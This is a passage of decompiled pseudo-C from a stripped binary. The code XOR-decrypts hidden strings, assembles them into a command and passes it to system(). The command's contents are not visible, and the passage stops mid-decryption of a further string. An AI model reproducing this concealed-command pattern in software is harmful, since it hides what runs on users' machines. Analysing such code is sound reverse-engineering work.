      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0x4d;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0xc5;
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0x41;
      *puVar14 = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ (byte)((ulong)uVar12 >> 0x38),
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ (byte)((ulong)uVar12 >> 0x30),
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^
                                            (byte)((ulong)uVar12 >> 0x28),
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^
                                                     (byte)((ulong)uVar12 >> 0x20),
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                              (byte)((ulong)uVar12 >> 0x18),
                                                              CONCAT12((byte)((ulong)uVar35 >> 0x10)
                                                                       ^ (byte)((ulong)uVar12 >>
                                                                               0x10),
                                                                       CONCAT11((byte)((ulong)uVar35
                                                                                      >> 8) ^
                                                                                (byte)((ulong)uVar12
                                                                                      >> 8),
                                                                                (byte)uVar35 ^
                                                                                (byte)uVar12)))))));
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0x2b;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0x59;
    }
    uVar12 = FUN_002295c4(&DAT_00233a70);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233ad0);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233ab0);
      uVar36 = _UNK_00177718;
      uVar34 = _DAT_00177710;
      uVar35 = _UNK_00177518;
      uVar12 = _DAT_00177510;
      *(undefined1 *)(puVar14 + 4) = 1;
      puVar14[1] = uVar36;
      *puVar14 = uVar34;
      puVar14[3] = uVar35;
      puVar14[2] = uVar12;
      FUN_002234c0(&LAB_001a80dc,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233ad0);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233ab0);
    FUN_001b570c();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233b10);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233af0);
      uVar35 = _UNK_001771c8;
      uVar12 = _DAT_001771c0;
      *(undefined1 *)((long)puVar14 + 0x12) = 1;
      puVar14[1] = uVar35;
      *puVar14 = uVar12;
      *(undefined2 *)(puVar14 + 2) = 0x6bc1;
      FUN_002234c0(&LAB_001a80e8,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233b10);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233af0);
    FUN_001b5734();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233b50);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233b30);
      uVar12 = _DAT_00177450;
      puVar14[1] = _UNK_00177458;
      *puVar14 = uVar12;
      *(undefined4 *)(puVar14 + 2) = 0x1a3b57c;
      FUN_002234c0(&LAB_001a80f4,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233b50);
      *puVar16 = 1;
    }
    uVar12 = FUN_002295c4(&DAT_00233b30);
    FUN_001b5778();
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233b90);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233b70);
      uVar12 = _DAT_00177830;
      puVar14[1] = _UNK_00177838;
      *puVar14 = uVar12;
      FUN_002234c0(&LAB_001a8100,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233b90);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233b70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233b70);
      cVar2 = *(char *)(lVar13 + 0xf);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233b70);
      *(undefined1 *)((long)puVar14 + 0xf) = 0;
      uVar12 = DAT_00177a20;
      *(byte *)(puVar14 + 1) = *(byte *)(puVar14 + 1) ^ 0x8d;
      *(byte *)((long)puVar14 + 9) = *(byte *)((long)puVar14 + 9) ^ 0x3f;
      uVar35 = *puVar14;
      *(byte *)((long)puVar14 + 10) = *(byte *)((long)puVar14 + 10) ^ 0x25;
      *(byte *)((long)puVar14 + 0xb) = *(byte *)((long)puVar14 + 0xb) ^ 0x1b;
      *(byte *)((long)puVar14 + 0xc) = *(byte *)((long)puVar14 + 0xc) ^ 0xeb;
      *puVar14 = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ (byte)((ulong)uVar12 >> 0x38),
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ (byte)((ulong)uVar12 >> 0x30),
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^
                                            (byte)((ulong)uVar12 >> 0x28),
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^
                                                     (byte)((ulong)uVar12 >> 0x20),
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                              (byte)((ulong)uVar12 >> 0x18),
                                                              CONCAT12((byte)((ulong)uVar35 >> 0x10)
                                                                       ^ (byte)((ulong)uVar12 >>
                                                                               0x10),
                                                                       CONCAT11((byte)((ulong)uVar35
                                                                                      >> 8) ^
                                                                                (byte)((ulong)uVar12
                                                                                      >> 8),
                                                                                (byte)uVar35 ^
                                                                                (byte)uVar12)))))));
      *(byte *)((long)puVar14 + 0xd) = *(byte *)((long)puVar14 + 0xd) ^ 0xe9;
      *(byte *)((long)puVar14 + 0xe) = *(byte *)((long)puVar14 + 0xe) ^ 0x53;
    }
    uVar12 = FUN_002295c4(&DAT_00233b70);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233bd0);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_00233bb0);
      FUN_001a810c(uVar12,&DAT_00177dff);
      FUN_002234c0(&LAB_001a8300,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233bd0);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233bb0);
      cVar2 = *(char *)(lVar13 + 0x3d);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233bb0);
      cVar2 = *(char *)(lVar13 + 0x3d);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233bb0);
      uVar35 = _UNK_00176c68;
      uVar12 = _DAT_00176c60;
      *(undefined1 *)((long)puVar14 + 0x3d) = 0;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      *(byte *)((long)puVar14 + 0x31) = *(byte *)((long)puVar14 + 0x31) ^ 0x93;
      *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 0x61;
      *(byte *)((long)puVar14 + 0x33) = *(byte *)((long)puVar14 + 0x33) ^ 0x1f;
      *(byte *)((long)puVar14 + 0x32) = *(byte *)((long)puVar14 + 0x32) ^ 0x8d;
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      *(byte *)((long)puVar14 + 0x35) = *(byte *)((long)puVar14 + 0x35) ^ 0x2b;
      *(byte *)((long)puVar14 + 0x34) = *(byte *)((long)puVar14 + 0x34) ^ 0x97;
      *(byte *)((long)puVar14 + 0x36) = *(byte *)((long)puVar14 + 0x36) ^ 0x6b;
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      uVar35 = puVar14[5];
      uVar12 = puVar14[4];
      *(byte *)((long)puVar14 + 0x37) = *(byte *)((long)puVar14 + 0x37) ^ 0xf;
      *(byte *)(puVar14 + 7) = *(byte *)(puVar14 + 7) ^ 0x61;
      *(byte *)((long)puVar14 + 0x39) = *(byte *)((long)puVar14 + 0x39) ^ 0x93;
      *(byte *)((long)puVar14 + 0x3a) = *(byte *)((long)puVar14 + 0x3a) ^ 0x8d;
      puVar14[5] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar35
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar35 >> 8) ^ bVar27,
                                                  (byte)uVar35 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar12
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar12 >> 8) ^ bVar19,
                                                  (byte)uVar12 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x3b) = *(byte *)((long)puVar14 + 0x3b) ^ 0x1f;
      *(byte *)((long)puVar14 + 0x3c) = *(byte *)((long)puVar14 + 0x3c) ^ 0x97;
    }
    uVar12 = FUN_002295c4(&DAT_00233bb0);
    FUN_00205098(&local_c8,uVar12);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233c10);
    if ((*pbVar11 & 1) == 0) {
      uVar12 = FUN_002295c4(&DAT_00233bf0);
      FUN_001a8314(uVar12,&DAT_00177e3c);
      FUN_002234c0(&LAB_001a84f0,uVar12,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233c10);
      *puVar16 = 1;
      lVar13 = FUN_002295c4(&DAT_00233bf0);
      cVar2 = *(char *)(lVar13 + 0x3a);
    }
    else {
      lVar13 = FUN_002295c4(&DAT_00233bf0);
      cVar2 = *(char *)(lVar13 + 0x3a);
    }
    if (cVar2 != '\0') {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233bf0);
      uVar35 = _UNK_00177698;
      uVar12 = _DAT_00177690;
      *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 0x37;
      *(byte *)((long)puVar14 + 0x31) = *(byte *)((long)puVar14 + 0x31) ^ 0x17;
      *(byte *)((long)puVar14 + 0x32) = *(byte *)((long)puVar14 + 0x32) ^ 0xeb;
      *(undefined1 *)((long)puVar14 + 0x3a) = 0;
      uVar36 = puVar14[1];
      uVar34 = *puVar14;
      uVar38 = puVar14[3];
      uVar37 = puVar14[2];
      *(byte *)((long)puVar14 + 0x33) = *(byte *)((long)puVar14 + 0x33) ^ 0x8f;
      *(byte *)((long)puVar14 + 0x34) = *(byte *)((long)puVar14 + 0x34) ^ 0xb3;
      *(byte *)((long)puVar14 + 0x35) = *(byte *)((long)puVar14 + 0x35) ^ 0x3f;
      *(byte *)((long)puVar14 + 0x36) = *(byte *)((long)puVar14 + 0x36) ^ 0xc1;
      uVar40 = puVar14[5];
      uVar39 = puVar14[4];
      bVar18 = (byte)uVar12;
      bVar19 = (byte)((ulong)uVar12 >> 8);
      bVar20 = (byte)((ulong)uVar12 >> 0x10);
      bVar21 = (byte)((ulong)uVar12 >> 0x18);
      bVar22 = (byte)((ulong)uVar12 >> 0x20);
      bVar23 = (byte)((ulong)uVar12 >> 0x28);
      bVar24 = (byte)((ulong)uVar12 >> 0x30);
      bVar25 = (byte)((ulong)uVar12 >> 0x38);
      bVar26 = (byte)uVar35;
      bVar27 = (byte)((ulong)uVar35 >> 8);
      bVar28 = (byte)((ulong)uVar35 >> 0x10);
      bVar29 = (byte)((ulong)uVar35 >> 0x18);
      bVar30 = (byte)((ulong)uVar35 >> 0x20);
      bVar31 = (byte)((ulong)uVar35 >> 0x28);
      bVar32 = (byte)((ulong)uVar35 >> 0x30);
      bVar33 = (byte)((ulong)uVar35 >> 0x38);
      *(byte *)((long)puVar14 + 0x37) = *(byte *)((long)puVar14 + 0x37) ^ 0x4d;
      *(byte *)(puVar14 + 7) = *(byte *)(puVar14 + 7) ^ 0x37;
      puVar14[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ bVar26)))))));
      *puVar14 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
      ;
      puVar14[3] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar27,
                                                  (byte)uVar38 ^ bVar26)))))));
      puVar14[2] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar19,
                                                  (byte)uVar37 ^ bVar18)))))));
      puVar14[5] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar33,
                            CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar32,
                                     CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar31,
                                              CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar30,
                                                       CONCAT13((byte)((ulong)uVar40 >> 0x18) ^
                                                                bVar29,CONCAT12((byte)((ulong)uVar40
                                                                                      >> 0x10) ^
                                                                                bVar28,CONCAT11((
                                                  byte)((ulong)uVar40 >> 8) ^ bVar27,
                                                  (byte)uVar40 ^ bVar26)))))));
      puVar14[4] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar24,
                                     CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar23,
                                              CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar22,
                                                       CONCAT13((byte)((ulong)uVar39 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar39
                                                                                      >> 0x10) ^
                                                                                bVar20,CONCAT11((
                                                  byte)((ulong)uVar39 >> 8) ^ bVar19,
                                                  (byte)uVar39 ^ bVar18)))))));
      *(byte *)((long)puVar14 + 0x39) = *(byte *)((long)puVar14 + 0x39) ^ 0x17;
    }
    uVar12 = FUN_002295c4(&DAT_00233bf0);
    FUN_00205098(&local_c8,uVar12);
    iVar10 = 0x578;
    do {
      FUN_00205098(&local_c8,&DAT_0013edc4);
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    pbVar11 = (byte *)FUN_002295c4(&DAT_00233c50);
    if ((*pbVar11 & 1) == 0) {
      puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233c30);
      uVar35 = _UNK_00176bd8;
      uVar12 = _DAT_00176bd0;
      *(undefined4 *)(puVar14 + 2) = 0x84477dd9;
      puVar14[1] = uVar35;
      *puVar14 = uVar12;
      *(undefined2 *)((long)puVar14 + 0x14) = 0x13b;
      FUN_002234c0(&LAB_001a8504,puVar14,0x2362d0);
      puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233c50);
      *puVar16 = 1;
    }
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233c30);
    FUN_001b57c8();
  }
  FUN_00205098(&local_c8,puVar14);
  pcVar1 = (char *)((ulong)&local_c8 | 1);
  if ((local_c8 & 1) != 0) {
    pcVar1 = local_b8;
  }
  system(pcVar1);
  local_e0 = 0;
  local_d8 = 0;
  local_d0 = (char *)0x0;
  pbVar11 = (byte *)FUN_002295c4(&DAT_00233f50);
  if ((*pbVar11 & 1) == 0) {
    uVar12 = FUN_002295c4(&DAT_00233f30);
    FUN_001a8ce0(uVar12,&DAT_00177f58);
    FUN_002234c0(&LAB_001a8fb4,uVar12,0x2362d0);
    puVar16 = (undefined1 *)FUN_002295c4(&DAT_00233f50);
    *puVar16 = 1;
    lVar13 = FUN_002295c4(&DAT_00233f30);
    cVar2 = *(char *)(lVar13 + 0x59);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_00233f30);
    cVar2 = *(char *)(lVar13 + 0x59);
  }
  if (cVar2 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00233f30);
    uVar35 = puVar14[1];
    uVar12 = *puVar14;
    uVar36 = puVar14[3];
    uVar34 = puVar14[2];
    *(undefined1 *)((long)puVar14 + 0x59) = 0;
    *(byte *)((long)puVar14 + 0x51) = *(byte *)((long)puVar14 + 0x51) ^ 0xdb;
    bVar18 = (byte)_DAT_00177720;
    bVar19 = (byte)((ulong)_DAT_00177720 >> 8);
    bVar20 = (byte)((ulong)_DAT_00177720 >> 0x10);
    bVar21 = (byte)((ulong)_DAT_00177720 >> 0x18);
    bVar22 = (byte)((ulong)_DAT_00177720 >> 0x20);
    bVar23 = (byte)((ulong)_DAT_00177720 >> 0x28);
    bVar24 = (byte)((ulong)_DAT_00177720 >> 0x30);
    bVar25 = (byte)((ulong)_DAT_00177720 >> 0x38);
    bVar26 = (byte)_UNK_00177728;
    bVar27 = (byte)((ulong)_UNK_00177728 >> 8);
    bVar28 = (byte)((ulong)_UNK_00177728 >> 0x10);
    bVar29 = (byte)((ulong)_UNK_00177728 >> 0x18);
    bVar30 = (byte)((ulong)_UNK_00177728 >> 0x20);
    bVar31 = (byte)((ulong)_UNK_00177728 >> 0x28);
    bVar32 = (byte)((ulong)_UNK_00177728 >> 0x30);
    bVar33 = (byte)((ulong)_UNK_00177728 >> 0x38);
    uVar38 = puVar14[9];
    uVar37 = puVar14[8];
    *(byte *)(puVar14 + 10) = *(byte *)(puVar14 + 10) ^ 0xd3;
    *(byte *)((long)puVar14 + 0x52) = *(byte *)((long)puVar14 + 0x52) ^ 0x59;
    puVar14[1] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar35 >> 0x10
                                                                              ) ^ bVar28,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar27,(byte)uVar35 ^ bVar26)))))))
    ;
    *puVar14 = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                        CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                 CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                          CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                   CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar21,
                                                            CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                     bVar20,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar19,(byte)uVar12 ^ bVar18)))))))
    ;
    puVar14[3] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar28,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar27,(byte)uVar36 ^ bVar26)))))))
    ;
    puVar14[2] = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
    ;
    uVar35 = puVar14[5];
    uVar12 = puVar14[4];
    uVar36 = puVar14[7];
    uVar34 = puVar14[6];
    *(byte *)((long)puVar14 + 0x54) = *(byte *)((long)puVar14 + 0x54) ^ 0xeb;
    *(byte *)((long)puVar14 + 0x53) = *(byte *)((long)puVar14 + 0x53) ^ 0xeb;
    *(byte *)((long)puVar14 + 0x55) = *(byte *)((long)puVar14 + 0x55) ^ 0xf7;
    puVar14[5] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar35 >> 0x10
                                                                              ) ^ bVar28,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar27,(byte)uVar35 ^ bVar26)))))))
    ;
    puVar14[4] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar12 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar19,(byte)uVar12 ^ bVar18)))))))
    ;
    puVar14[7] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar28,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar27,(byte)uVar36 ^ bVar26)))))))
    ;
    puVar14[6] = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar34 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar19,(byte)uVar34 ^ bVar18)))))))
    ;
    puVar14[9] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar28,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar27,(byte)uVar38 ^ bVar26)))))))
    ;
    puVar14[8] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar22,
